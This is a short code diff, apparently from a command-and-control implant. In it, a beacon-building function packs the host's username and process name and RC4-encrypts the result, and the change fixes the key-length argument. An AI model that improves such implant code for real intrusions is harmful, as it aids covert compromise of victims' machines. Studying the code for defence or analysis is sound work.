@@ -118,7 +118,7 @@ BYTE* Agent::BuildBeat(ULONG* size)
 	packer->PackStringA(this->info->username);
 	packer->PackStringA(this->info->process_name);
 
-	EncryptRC4(packer->data(), packer->datasize(), this->config->encrypt_key, 16);
+	EncryptRC4(packer->data(), packer->datasize(), this->config->encrypt_key, static_cast<int>(this->config->encrypt_key_size));
 
 	MemFreeLocal((LPVOID*)&this->info->domain_name,   StrLenA(this->info->domain_name));
 	MemFreeLocal((LPVOID*)&this->info->computer_name, StrLenA(this->info->computer_name));
